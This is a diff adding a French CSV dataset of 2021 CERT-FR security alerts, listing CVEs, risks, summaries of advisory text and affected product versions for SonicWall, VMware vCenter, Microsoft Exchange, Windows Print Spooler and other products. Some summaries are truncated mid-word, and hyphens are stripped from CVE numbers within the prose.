@@ -1,0 +1,1693 @@
+reference,title,closed_at,cves,risks,summary,first_revision,affected_systems
+CERTFR-2021-ALE-001,|MàJ] Vulnérabilité dans SonicWall SMA100,2021-05-12,CVE-2021-20016; CVE-2014-6271,Exécution de code arbitraire à distance,"\[Mise à jour du 30 avril 2021\]
+
+Le 29 avril 2021, dans un billet de blogue (cf. section Documentation),
+FireEye fait état de l'exploitation de la vulnérabilité CVE202120016
+par un groupe criminel dans le but de déployer plusieurs rançongiciels à
+l'encontre de différentes entités en Europe et en Amérique du Nord.
+
+\[Mise à jour du 22 février 2021\]
+
+Le 19 février 2021, SonicWall a publié un nouveau correctif pour les
+versions 10.x, mais aussi pour les versions 9.x non concernées par la
+vulnérabilité CVE202120016 (cf. section Documentation).
+
+Dans son communiqué, SonicWall indique que ce correctif contient, sans
+les préciser, des mesures de durcissement du code et invite ses clients
+à l'installer immédiatement.
+
+\[Mise à jour du 04 février 2021\]
+
+Le 03 février 2021, SonicWall a publié un correctif pour la
+vulnérabilité qui porte désormais l'identifiant CVE202120016. Cette
+vulnérabilité permet à un attaquant non authentifié d'obtenir les
+informations de connexions, y compris celles des comptes
+administrateurs. L'attaquant peut alors prendre complètement la main sur
+l'équipement.
+
+Cette nouvelle précision confirme qu'il est obligatoire de changer tous
+les mots de passe une fois le correctif appliqué.
+
+\[Publication initiale\]
+
+Le 01 février 2021, SonicWall a confirmé l'existence d'une vulnérabilité
+de type 0 jour dans leurs passerelles d'accès sécurisé SMA séries 100.
+Celleci affecte uniquement les versions 10.x.
+
+Les risques liés à cette vulnérabilité ne sont pas précisés, ma",2021-02-02T01:00:00.000000,"Sonicwall Secure Mobile Access – SMA 200, SMA 210, SMA 400 et SMA 410 versions 10.x antérieures à 10.2.0.6-32sv | Sonicwall Secure Mobile Access – SMA 200, SMA 210, SMA 400 et SMA 410 versions 9.x antérieures à 9.0.0.10-28sv | Sonicwall Secure Mobile Access – SMA 500v (Azure, AWS, ESXi, HyperV) versions 10.x antérieures à 10.2.0.6-32sv | Sonicwall Secure Mobile Access – SMA 500v (Azure, AWS, ESXi, HyperV) versions 9.x antérieures à 9.0.0.10-28sv"
+CERTFR-2021-ALE-002,[MàJ] Vulnérabilité dans Google Chrome et Microsoft Edge,2021-03-11,CVE-2021-21148,Non spécifié par l'éditeur,"\[Mise à jour du 08 février 2021\]
+
+Le navigateur Microsoft Edge
+disposant d'une version basée sur Chromium, l'éditeur a publié une mise
+à jour pour cette version afin de fixer cette
+vulnérabilité.
+
+\[Version originale\]
+
+Le 04 février 2021, Google a publié un correctif pour la vulnérabilité
+CVE202121148 affectant son navigateur Chrome. Cette vulnérabilité
+permet un débordement de tampon dans le tas.
+
+Google indique avoir connaissance de l'existence d'un code d'attaque
+exploitant cette vulnérabilité.
+
+Le CERTFR recommande donc l'application de la mise à jour dans les plus
+brefs délais.",2021-02-05T01:00:00.000000,Microsoft Edge – Microsoft Edge (Chromium-based) versions antérieures à 88.0.705.63 | Google Chrome – Google Chrome versions antérieures à 88.0.4324.150
+CERTFR-2021-ALE-003,[MàJ] Vulnérabilité dans VMware vCenter Server,2021-05-12,CVE-2021-21972,Exécution de code arbitraire à distance,"\[version du 26 février 2021\]
+
+Le CERTFR a connaissance d'attaques en cours ciblant des serveurs
+vCenter exposés sur Internet. Il est urgent de procéder soit à
+l'application du contournement pour désactiver le greffon vulnérable
+soit de déployer les versions corrigeant la vulnérabilité.
+
+\[version initiale\]
+
+Le 23 février 2021, VMware a publié un avis de sécurité concernant trois
+vulnérabilités (cf. section documentation). La
+vulnérabilité CVE202121972 est la plus critique. Elle permet une
+exécution de code arbitraire à distance par un attaquant non
+authentifié.
+
+Cette vulnérabilité affecte un greffon de vCenter Server permettant la
+communication entre vCenter Server et la solution
+VMware vRealize Operations (vROPs). Ce greffon vulnérable est présent
+dans toutes les installations par défaut de vCenter. VMware précise que
+l'exploitation de la vulnérabilité est possible même si la solution
+vRealize Operations n'est pas utilisée.
+
+Des preuves de concept sont disponibles publiquement et le CERTFR a
+connaissance de campagnes de détection de la
+vulnérabilité CVE202121972, il est donc urgent d'appliquer le
+correctif de sécurité.
+
+De plus, le CERTFR a constaté la présence d'instances de vCenter
+directement accessibles sur internet. Ceci est contraire aux bonnes
+pratiques.
+
+Pour rappel, ce type de services ne doit jamais être exposé sur
+internet. Lorsque cela se révèle absolument nécessaire, il est fortement
+recommandé de recourir à des solutions d'accès sécurisés à distance.
+
+Ainsi",2021-02-25T01:00:00.000000,VMware vCenter Server – Cloud Foundation (vCenter Server) versions 4.x antérieures à 4.2 | VMware vCenter Server – vCenter Server versions 6.5 antérieures à 6.5 U3n | VMware vCenter Server – Cloud Foundation (vCenter Server) versions 3.x antérieures à 3.10.1.2 | VMware vCenter Server – vCenter Server versions 7.0 antérieures à 7.0 U1c | VMware vCenter Server – vCenter Server versions 6.7 antérieures à 6.7 U3l
+CERTFR-2021-ALE-004,[MàJ] Multiples vulnérabilités dans Microsoft Exchange Server,2021-07-16,CVE-2021-26858; CVE-2021-27078; CVE-2021-26857; CVE-2021-26855; CVE-2021-27065; CVE-2021-26412; CVE-2021-26854,Exécution de code arbitraire à distance,"\[version du 16 mars 2021\]
+
+le 15 mars 2021, Microsoft a publié un nouvel outil dont le but annoncé
+est d'aider leurs clients à se protéger de l'exploitation de la
+vulnérabilité CVE202126855 affectant les serveurs de courrier Exchange
+en attendant l'application des mises à jour
+[(https://msrcblog.microsoft.com/2021/03/15/oneclickmicrosoftexchangeonpremisesmitigationtoolmarch2021/).](https://msrcblog.microsoft.com/2021/03/15/oneclickmicrosoftexchangeonpremisesmitigationtoolmarch2021/)
+
+Les détails de cet outil sont développés dans la section ""Contournement
+provisoire"".
+
+Le CERTFR souhaite cependant insister sur plusieurs points:
+
+   Cet outil ne protège que contre une exploitation future de la
+    vulnérabilité CVE202126855, en attendant l'application de la mise
+    à jour fournie le 2 mars 2021 ;
+   Les vulnérabilités ayant été exploitées avant la publication des
+    correctifs, puis de façon massive, tous les serveurs Exchange
+    doivent être considérés comme compromis. L'utilisation de cet outil
+    ne remplace pas l'étape de recherche de compromission (voir les
+    recommandations de cette alerte) ;
+   De plus en plus de codes d'exploitation sont publiquement
+    disponibles. L'outil de Microsoft tente d'annuler certaines
+    modifications malveillantes réalisées lors de l'exploitation de la
+    vulnérabilité CVE202126855, mais cela ne fonctionne que pour une
+    partie des codes d'exploitation connus.
+
+\[version du 9 mars 2021\]
+
+Le CERTFR recommande fortement de toujou",2021-03-03T01:00:00.000000,
+CERTFR-2021-ALE-005,Multiples vulnérabilités dans Microsoft DNS server,2021-05-12,CVE-2021-26893; CVE-2021-26897; CVE-2021-26894; CVE-2021-26877; CVE-2021-26895,Exécution de code arbitraire à distance,"Contexte
+
+Sept vulnérabilités concernant le serveur DNS de Microsoft ont fait
+l’objet d’un correctif à l’occasion de la mise à jour mensuelle de mars
+2021. Parmi ces vulnérabilités, deux permettent un déni de service alors
+que les cinq autres permettent une exécution de code arbitraire à
+distance. Ces vulnérabilités, identifiées par CVE202126877,
+CVE202126897, CVE202126893, CVE202126894 et CVE202126895 sont
+considérées comme critiques.
+
+ 
+
+ Nature et impact des vulnérabilités
+
+Toutes les vulnérabilités affectent le mécanisme de Dynamic Zone
+Update du serveur DNS de Microsoft.
+
+Ce mécanisme existe en mode sécurisé (dans ce mode, les demandes de mise
+à jour d'enregistrement DNS doivent être authentifiées et autorisées
+pour être acceptées) ou nonsécurisé (dans ce cas, le serveur DNS
+accepte toutes les demandes de mise à jour d'un enregistrement DNS).
+
+ 
+
+Le mécanisme est configuré différemment suivant les installations :
+
+   Lorsque la zone DNS est intégrée à Active Directory, le mode
+    sécurisé est activé par défaut ;
+   Lorsque la zone DNS n’est pas intégrée à Active Directory mais
+    stockée localement sur le serveur DNS, le mécanisme Dynamic Zone
+    Update n’est pas activé par défaut. S’il est activé, il ne sera
+    disponible que dans le mode nonsécurisé (non recommandé).
+
+ 
+
+Les impacts des vulnérabilités sont les suivants :
+
+   Si le mode nonsécurisé est activé, l’attaquant peut anonymement
+    forger une requête spécifiquement conçue pour exploiter ces
+    vulnérabil",2021-03-12T01:00:00.000000,
+CERTFR-2021-ALE-006,[MàJ] Vulnérabilité dans F5 BIG-IP,2021-04-15,CVE-2021-22986,Exécution de code arbitraire à distance,"\[mise à jour du 22 mars 2021\]
+
+Un nouveau vecteur d'attaque a été publié qui ne requiert plus
+d'exploiter une SSRF et de nouveaux codes d'attaques sont désormais
+disponibles. Toute requête HTTP de type POST reçue par l'API REST
+iControl serait par conséquent potentiellement malveillante.
+
+\[version originale\]
+
+Dans son bulletin d'actualité du 15 mars 2021, le CERTFR soulignait la
+gravité de plusieurs vulnérabilités affectant les équipements BIGIP
+de F5 Networks, et notamment la CVE202122986.
+
+Le 19 mars 2021, l'éditeur indique que des attaques massives sont en
+cours, attaques également détectées par des sources telles que \[1\].
+
+La vulnérabilité CVE202122986 est une vulnérabilité de type 'SSRF'
+(Server Side Request Forgery) qui permet à un attaquant non
+authentifié ayant un accès à l'API REST iControl de provoquer une
+exécution de code arbitraire à distance.
+
+Cette API permet l'automatisation de certaines tâches
+d'administration. Elle est accessible depuis l'interface
+d'administration de l'équipement mais également depuis les adresses IP
+dénommées selfIPs qui peuvent être configurées via le menu Network /
+SelfIPs dans les différents VLANs auxquels ces équipements sont
+connectés.",2021-03-22T01:00:00.000000,F5 BIG-IP – BIG-IP versions 16.x antérieures à 16.0.1.1 | F5 BIG-IP – BIG-IP versions 13.x antérieures à 13.1.3.6 | F5 BIG-IP – BIG-IP versions 12.x antérieures à 12.1.5.3 | F5 BIG-IP – BIG-IP versions 15.x antérieures à 15.1.2.1 | F5 BIG-IP – BIG-IP versions 14.x antérieures à 14.1.4
+CERTFR-2021-ALE-007,[MàJ] Vulnérabilité dans Pulse Connect Secure,2021-06-21,CVE-2021-22893; CVE-2021-22894; CVE-2021-22899; CVE-2021-22900,Exécution de code arbitraire à distance,"\[version du 3 mai 2021\]
+
+L'éditeur a publié le correctif pour la vulnérabilité CVE202122893,
+ainsi que les vulnérabilités CVE202122894, CVE202122899 et
+CVE202122900 avec un score CVSSv3 respectivement de 9.9, 9.9 et 7.2.
+
+Si des mesures de contournement ont été appliquées, elles doivent être
+retirées en important le fichier removeworkaround2104.xml, et les
+paramètres ""Files,
+Windows"" et ""Meetings"" doivent être
+restaurés avant l'application du correctif (cf. bulletin de sécurité de
+l'éditeur).
+
+\[version du 20 avril 2021\]
+
+Le 20 avril 2021, Pulse Secure a publié un bulletin de sécurité
+concernant la vulnérabilité CVE202122893 (cf. section Documentation).
+Celleci permet à un attaquant non authentifié d'exécuter du code
+arbitraire à distance. Aucun correctif n'est pour l’instant disponible.
+
+Le même jour, FireEye a publié un billet de blogue (cf. section
+Documentation) expliquant que cette vulnérabilité est activement
+exploitée dans le cadre d'attaques ciblées. Au cours d'une exploitation,
+les attaquants modifient certains fichiers pour déposer des portes
+dérobées et effacer leurs traces.
+
+Pulse Secure a publié un outil qui tente de détecter ces
+modifications (cf. section Documentation).",2021-04-20T02:00:00.000000,N/A N/A – Pulse Connect Secure versions 9.1RX | N/A N/A – Pulse Connect Secure versions 9.0R3 et ultérieures
+CERTFR-2021-ALE-008,Multiples vulnérabilités dans Exim,2021-06-10,CVE-2021-27216; CVE-2020-28013; CVE-2020-28026; CVE-2020-28009; CVE-2020-28023; CVE-2020-28011; CVE-2020-28022; CVE-2020-28008; CVE-2020-28021; CVE-2020-28024; CVE-2020-28018; CVE-2020-28010; CVE-2020-28017; CVE-2020-28012; CVE-2020-28007; CVE-2020-28020; CVE-2020-28015; CVE-2020-28016; CVE-2020-28025; CVE-2020-28014; CVE-2020-28019,Exécution de code arbitraire à distance; Élévation de privilèges; Contournement de la politique de sécurité; Non spécifié par l'éditeur,"Le 5 mai 2021, Qualys a publié un bulletin de sécurité contenant 21
+vulnérabilités affectant le serveur mail Exim. Quatre de ces
+vulnérabilités permettent une élévation de privilège et trois une
+exécution de code arbitraire. Ces vulnérabilités affectent toutes les
+versions de Exim antérieures à 4.94 et permettent in fine à un attaquant non
+authentifié de prendre le contrôle du serveur mail avec les privilèges du compte
+root.",2021-05-05T02:00:00.000000,Exim N/A – Exim versions antérieures à 4.94
+CERTFR-2021-ALE-009,[MàJ] Vulnérabilité dans Microsoft Windows,2021-06-10,CVE-2021-31166,Exécution de code arbitraire à distance,"\[version du 21 mai 2021\]
+
+Le CERTFR a connaissance de l'existence de codes d'attaques publics
+provoquant un déni de service sur l'équipement ciblé. Il est fortement
+recommandé de mettre à jour les postes de travail et les serveurs
+installés avec les versions du système d'exploitation affectées par
+cette vulnérabilité.
+
+\[version initiale\]
+
+Le système d'exploitation Microsoft Windows propose un service de
+gestion des requêtes HTTP sous la forme d'un pilote en mode noyau appelé
+http.sys. Une vulnérabilité a été découverte dans ce pilote pour Windows
+Server et Windows 10. Elle permet à un attaquant de provoquer une
+exécution de code arbitraire à distance et l'éditeur considère qu'elle
+peut être exploitée dans le cadre d'attaques à propagation de type ""ver
+informatique"".
+
+Le pilote http.sys est notamment utilisé par Microsoft IIS, le service
+Windows Remote Management (WinRM) ainsi que le service SSDP. Il est donc
+présent sur les serveurs mais également sur les postes de travail. Par
+conséquent, le CERTFR recommande de considérer que l'ensemble des
+machines utilisant une version de Windows affectée est vulnérable.
+
+La vulnérabilité a été découverte par l'éditeur, cependant la
+probabilité que des codes d'attaques soient mis au point rapidement est
+très élevée.",2021-05-12T02:00:00.000000,Microsoft Windows – Windows 10 version 20H2 | Microsoft Windows – Windows Server version 2004 | Microsoft Windows – Windows Server version 20H2 | Microsoft Windows – Windows 10 version 2004
+CERTFR-2021-ALE-010,Vulnérabilité dans Adobe Acrobat et Acrobat Reader,2021-06-29,CVE-2021-28550,Exécution de code arbitraire,"Une vulnérabilité a été découverte dans Adobe Acrobat et Acrobat Reader.
+Elle permet à un attaquant de provoquer une exécution de code
+arbitraire. L'éditeur indique que cette vulnérabilité aurait été
+exploitée dans des attaques ciblées visant des utilisateurs d'Acrobat
+Reader sur Windows.",2021-05-12T02:00:00.000000,
+CERTFR-2021-ALE-011,Vulnérabilité dans VMware vCenter Server,2021-10-19,CVE-2021-21985,Exécution de code arbitraire à distance,"Le 25 mai 2021, VMware a publié un correctif pour la vulnérabilité
+CVE202121985 affectant le greffon Virtual SAN Health Check qui est
+installé par défaut dans vCenter Server.
+
+L'exploitation de cette vulnérabilité permet à un attaquant non
+authentifié d'exécuter du code arbitraire à distance avec un haut niveau
+de privilèges. De plus, des codes d'attaques sont disponibles
+publiquement pour la vulnérabilité CVE202121985 et le CERTFR a
+connaissance d'exploitations actives de celleci.
+
+Le CERTFR rappelle que les interfaces de gestion ne doivent pas être
+accessibles directement sur internet. Toutefois, le CERTFR constate la
+disponibilité d'un certain nombre d'interfaces de gestion vCenter sur
+internet. A ce sujet, l'ANSSI a publié les guides suivants concernant
+l'accès sécurisé à distance :
+
+   
+    (pour ESXi 5)
+   
+    (de portée plus générale)",2021-06-07T02:00:00.000000,VMware vCenter Server – vCenter Server versions 6.5 antérieures à 6.5 U3p | VMware vCenter Server – Cloud Foundation (vCenter Server) versions 3.x antérieures à 3.10.2.1 | VMware vCenter Server – vCenter Server versions 7.0 antérieures à 7.0 U2b | VMware vCenter Server – vCenter Server versions 6.7 antérieures à 6.7 U3n | VMware vCenter Server – Cloud Foundation (vCenter Server) versions 4.x antérieures à 4.2.1
+CERTFR-2021-ALE-012,Multiples vulnérabilités dans Microsoft Windows,2021-10-19,CVE-2021-31201; CVE-2021-31955; CVE-2021-33739; CVE-2021-31199; CVE-2021-31956; CVE-2021-33742,Exécution de code arbitraire à distance; Élévation de privilèges; Atteinte à la confidentialité des données,"A l'occasion de sa mise à jour mensuelle de juin 2021, Microsoft a
+publié des correctifs, entre autres, pour six vulnérabilités qui sont
+activement exploitées dans le cadre d'attaques ciblées.
+
+Quatre de ces vulnérabilités (CVE202131199, CVE202131201,
+CVE202131956 et CVE202133739) permettent une élévation de privilège,
+la vulnérabilité CVE202131955 concerne une fuite d'information, enfin
+la vulnérabilité CVE202133742 donne à un attaquant la possibilité
+d'exécuter du code arbitraire à distance.
+
+Lorsque ces vulnérabilités sont enchaînées, elles permettent à un
+attaquant de prendre complètement la main sur une machine si un
+utilisateur se rend sur un site malveillant.
+
+Le CERTFR recommande donc l'application des correctifs dans les plus
+brefs délais.",2021-06-09T02:00:00.000000,"Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 20H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows 10 Version 1909 pour systèmes 32 bits | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 7 pour systèmes 32 bits Service Pack 1 | Microsoft Windows – Windows 10 Version 1809 pour systèmes x64 | Microsoft Windows – Windows 10 pour systèmes x64 | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows 10 Version 2004 pour systèmes 32 bits | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1909 pour systèmes x64 | Microsoft Windows – Windows 10 Version 2004 pour ARM64-based Systems | Microsoft Windows – Windows 7 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 21H1 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1909 pour ARM64-based Systems | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 10 Version 1809 pour ARM64-based Systems | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 8.1 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows 10 Version 1607 pour systèmes x64 | Microsoft Windows – Windows 10 Version 2004 pour systèmes x64 | Microsoft Windows – Windows 10 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 21H1 pour ARM64-based Systems | Microsoft Windows – Windows 8.1 pour systèmes 32 bits | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 pour systèmes 32 bits | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 pour ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 pour systèmes 32 bits"
+CERTFR-2021-ALE-013,[MaJ] Vulnérabilité dans Microsoft Windows,2021-07-02,CVE-2021-1675,Élévation de privilèges; Exécution de code arbitraire à distance,"\[version mise à jour le 02 juillet 2021 : cette alerte est remplacée
+par l'alerte CERTFR2021ALE014\]  
+
+
+La vulnérabilité CVE20211675 est correctement corrigée par le
+correctif publié par l'éditeur lors du Patch Tuesday de juin 2021. Les
+codes d'attaque publiés le 29 juin exploitent une autre vulnérabilité du
+spouleur d'impression. Se référer à
+[https://www.cert.ssi.gouv.fr/alerte/CERTFR2021ALE014](https://www.cert.ssi.gouv.fr/alerte/CERTFR2021ALE014)
+
+ 
+
+\[version mise à jour le 30 juin 2021 à 19h20 : ajout d'informations
+d'aide à la détection\]
+
+Le 8 juin 2021, Microsoft publiait des correctifs concernant des
+vulnérabilités critiques de type « jour zéro » (zero day). Une de ces
+vulnérabilités, la CVE20211675, affecte le service spouleur
+d'impression (print spooler), un composant logiciel du système
+d’exploitation Microsoft Windows activé par défaut. Cette vulnérabilité
+permettait initialement, selon Microsoft, une escalade de privilèges en
+local. Son score CVSSv3 s’élevait alors à 7.8.
+
+Le 29 juin 2021, deux chercheurs ont présenté une nouvelle façon
+d’exploiter cette vulnérabilité, cette fois à distance et ce malgré le
+correctif proposé par Microsoft. La CVE20211675 doit donc être
+considérée comme une vulnérabilité non corrigée permettant une exécution
+de code à distance, entraînant une élévation de privilèges avec les
+droits SYSTEM. Son score CVSSv3 est donc amené à évoluer.
+
+Des codes d'exploitation sont publiquement disponibles sur Internet,
+ce qui signifie que l’explo",2021-06-30T02:00:00.000000,"Microsoft Windows – Windows 10 for x64-based Systems | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 for 32-bit Systems | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows 8.1 for 32-bit systems | Microsoft Windows – Windows 7 for 32-bit Systems Service Pack 1 | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows 8.1 for x64-based systems | Microsoft Windows – Windows 10 Version 2004 for 32-bit Systems | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 1607 for 32-bit Systems | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H1 for 32-bit Systems | Microsoft Windows – Windows 10 Version 2004 for x64-based Systems | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows 10 Version 1909 for 32-bit Systems | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 1909 for x64-based Systems | Microsoft Windows – Windows 10 Version 20H2 for x64-based Systems | Microsoft Windows – Windows 7 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for 32-bit Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 | Microsoft Windows – Windows 10 Version 2004 for ARM64-based Systems | Microsoft Windows – Windows 10 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1809 for x64-based Systems | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H1 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 21H1 for x64-based Systems | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 10 Version 1809 for ARM64-based Systems | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows 10 Version 1607 for x64-based Systems | Microsoft Windows – Windows 10 Version 1909 for ARM64-based Systems"
+CERTFR-2021-ALE-014,[MaJ] Multiples vulnérabilités dans Microsoft Windows,2022-01-05,CVE-2021-34481; CVE-2021-36958; CVE-2021-34527; CVE-2021-1675,Élévation de privilèges; Exécution de code arbitraire à distance,"\[version du 12 août 2021\]
+
+Le 11 août 2021, Microsoft a publié un avis concernant la
+vulnérabilité CVE202136958 affectant le spouleur d’impression (print
+spooler). Microsoft indique que cette vulnérabilité permet une
+exécution de code arbitraire à distance. Le CERT/CC ajoute qu'en se
+connectant à une imprimante malveillante, l'attaquant peut exécuter du
+code arbitraire avec les privilèges SYSTEM \[8\].
+
+Aucun correctif n'est disponible pour l'instant. Microsoft conseille
+donc de désactiver le service.
+
+Comme la désactivation complète des impressions est difficilement
+réalisable, le CERTFR renvoie vers les recommandations formulées dans
+le paragraphe \[version initiale\].
+
+\[version du 11 août\]
+
+Microsoft a publié une mise à jour de sécurité
+([KB5005652](https://support.microsoft.com/help/5005652)) corrigeant la
+vulnérabilité référencée par l'identifiant CVE202134481 \[7\]. Point
+important : Microsoft a récemment pris connaissance d'un scénario
+d'attaque à distance pour cette vulnérabilité dont l'impact initial se
+restreignait alors seulement à une élévation de privilèges locaux.
+Ainsi, Microsoft a donc révisé son évaluation en conséquence. Le score
+CVSSv3 de cette vulnérabilité s'élève maintenant à 8.8. Nous vous
+recommandons d'installer ces mises à jour immédiatement.
+
+\[version du 16 juillet, 15h30\]
+
+Le 6 juillet 2021, Microsoft annonçait un correctif pour la
+CVE202134527 afin de protéger les systèmes Windows contre une attaque
+distante. Cependant, le 15 juillet 2021, M",2021-07-02T02:00:00.000000,"Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 8.1 for 32-bit systems | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 1607 for 32-bit Systems | Microsoft Windows – Windows 10 Version 21H1 for 32-bit Systems | Microsoft Windows – Windows 10 Version 2004 for x64-based Systems | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 1809 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 21H1 for x64-based Systems | Microsoft Windows – Windows 10 for x64-based Systems | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 for 32-bit Systems | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows 7 for 32-bit Systems Service Pack 1 | Microsoft Windows – Windows 8.1 for x64-based systems | Microsoft Windows – Windows 10 Version 2004 for 32-bit Systems | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 for x64-based Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows 10 Version 1909 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1909 for x64-based Systems | Microsoft Windows – Windows 10 Version 20H2 for x64-based Systems | Microsoft Windows – Windows 7 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for 32-bit Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 | Microsoft Windows – Windows 10 Version 2004 for ARM64-based Systems | Microsoft Windows – Windows 10 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1809 for x64-based Systems | Microsoft Windows – Windows 10 Version 1909 for ARM64-based Systems | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H1 for ARM64-based Systems"
+CERTFR-2021-ALE-015,Multiples vulnérabilités dans SolarWinds Serv-U,2021-10-19,CVE-2021-35211,Exécution de code arbitraire à distance,"Le 9 juillet 2021, SolarWinds a publié un correctif pour la
+vulnérabilité CVE202135211 affectant les composants Managed File
+Transfer et Secure FTP des produits ServU avec une version
+antérieure à 15.2.3 HF2.
+
+Cette vulnérabilité de type ""jour zéro"" (zero day) a été découverte
+par Microsoft et permet à un attaquant de pouvoir exécuter du code
+arbitraire à distance avec des privilèges élevés. Microsoft déclare
+avoir détecté des exploitations ciblées de cette vulnérabilité.
+
+Cependant, dans le cas où le SSH n'est pas activé sur votre produit
+SolarWinds ServU la vulnérabilité ne peut pas être exploitée.",2021-07-13T02:00:00.000000,SolarWinds Serv-U – SolarWinds Serv-U versions antérieures à 15.2.3 HF2
+CERTFR-2021-ALE-016,Vulnérabilité dans SonicWall,2021-08-19,Aucune,Atteinte à la confidentialité des données; Atteinte à l'intégrité des données,"Une vulnérabilité de type injection SQL a été découverte dans SonicWall
+Secure Mobile Access (SMA) et Secure Remote Access (SRA). Elle permet à
+un attaquant de provoquer une atteinte à l'intégrité des données et une
+atteinte à la confidentialité des données. L'éditeur a émis un bulletin
+d'alerte \[1\] dans lequel il précise qu'une campagne de rançonnage
+ciblant les équipements SonicWall vulnérable est en cours de
+planification par un attaquant disposant de comptes et de mots de passe
+volés.
+
+Le CERTFR recommande fortement de suivre les préconisations de
+l'éditeur :
+
+   déconnecter les équipements obsolètes et pour lesquels aucun
+    correctif n'est proposé
+   appliquer les derniers correctifs de sécurité sur les équipements
+    maintenus par l'éditeur
+   renouveler l'ensemble des mots de passe pour les comptes
+    utilisateurs et administrateurs ainsi que les comptes techniques
+   activer l'authentification à plusieurs facteurs",2021-07-15T02:00:00.000000,Sonicwall N/A – SSL-VPN 200/2000/400 toutes versions (le produit est obsolète et n'est plus maintenu par l'éditeur) | Sonicwall N/A – Secure Mobile Access 210/410/500v versions antérieures à 10.2.0.7-34sv et 9.0.0.10-28sv | Sonicwall N/A – Secure Remote Access 4600/1600 toutes versions (le produit est obsolète et n'est plus maintenu par l'éditeur) | Sonicwall N/A – Secure Remote Access 4200/1200 toutes versions (le produit est obsolète et n'est plus maintenu par l'éditeur) | Sonicwall N/A – Secure Mobile Access 400/200 versions antérieures à 10.2.0.7-34 et 9.0.0.10
+CERTFR-2021-ALE-017,Multiples vulnérabilités dans Microsoft Exchange,2022-05-04,CVE-2021-31207; CVE-2021-34473; CVE-2021-34523,Exécution de code arbitraire à distance; Élévation de privilèges; Contournement de la politique de sécurité,"Dans son bulletin d'actualité CERTFR2021ACT035 du 12 août 2021
+[\[1\]](http://suite%20à%20la%20publication%20d'une%20technique%20permettant%20de%20prendre%20le%20contrôle%20d'un%20serveur%20Microsoft%20Exchange),
+le CERTFR revenait sur la publication d'une technique permettant de
